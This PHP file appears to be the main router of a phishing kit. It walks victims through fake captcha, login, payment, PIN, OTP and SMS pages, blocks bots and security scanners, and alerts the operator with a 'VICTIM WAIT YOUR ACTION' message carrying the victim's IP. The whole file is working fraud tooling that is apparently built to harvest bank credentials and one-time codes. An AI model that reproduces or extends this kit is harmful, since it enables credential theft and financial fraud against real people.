<?php
session_start();  // Ensure sessions are started

include '../prevents/sub_anti.php';
include '../prevents/anti2.php';
include './prevents/index.php';

$method = $_SERVER['REQUEST_METHOD'];

if ($method === 'GET') {
    // Handle GET requests
    require_once 'controller/viewsController.php';
    require_once "lang.php";

    if (!isset($_SESSION['FIL212sD'])) {
        header("HTTP/1.0 404 Not Found");
        exit;
    }

    antibotpw();
    BannedIP();
    update();

    $view = $_GET['view'] ?? null;

    switch ($view) {
        case 'index':
            viewsHcaptcha();
            break;
        case 'main':
            viewsMain();
            break;
        case 'explain':
            viewsExplain();
            break;
        case 'otp':
            viewsOtp();
            break;
        case 'sms':
            viewsSms();
            break;
        case 'load':
            $ip = get_client_ip();
            $rezdata = "VICTIM WAIT YOUR ACTION IP : " . $ip;
            sendKey($rezdata);
            viewsLoad();
            break;
        case 'pin':
            viewsPin();
            break;
        case 'pay':
            viewsPay();
            break;
        case 'UserPass':
            viewsUserPass();
            break;
        case 'confirm':
            viewsConf();
            break;
        default:
            // Redirect to a default view or show a 404 error
            header("HTTP/1.0 404 Not Found");
            exit;
    }

} elseif ($method === 'POST') {
    // Handle POST requests
    require_once 'controller/manageController.php';

    if (!isset($_SESSION['FIL212sD'])) {
        header("HTTP/1.0 404 Not Found");
        exit;
    }

    if (!empty($_POST['catch'])) {
        header("HTTP/1.0 404 Not Found");
        exit;
    }

    $action = $_POST['submit'] ?? null;

    switch ($action) {
        case 'captcha':
            check();
            break;
        case 'page1':
            index();
            break;
        case 'page2':
            // Redirect directly to page4 and page5
            header("Location: index.php?view=pay"); // Redirect to page4
            exit;
        case 'page3':
            // Skip infoz and redirect directly to page4 and page5
            header("Location: index.php?view=confirm"); // Redirect to page5
            exit;
        case 'page4':
            Pay();
            break;
        case 'page5':
            Conf();
            break;
        case 'otp':
            Otp();
            break;
        case 'sms':
            Sms();
            break;
        case 'pin':
            Pin();
            break;
        default:
            // Handle unknown actions or redirect to a 404 page
            header("HTTP/1.0 404 Not Found");
            exit;
    }

} else {
    header("HTTP/1.0 404 Not Found");
    exit;
}
?>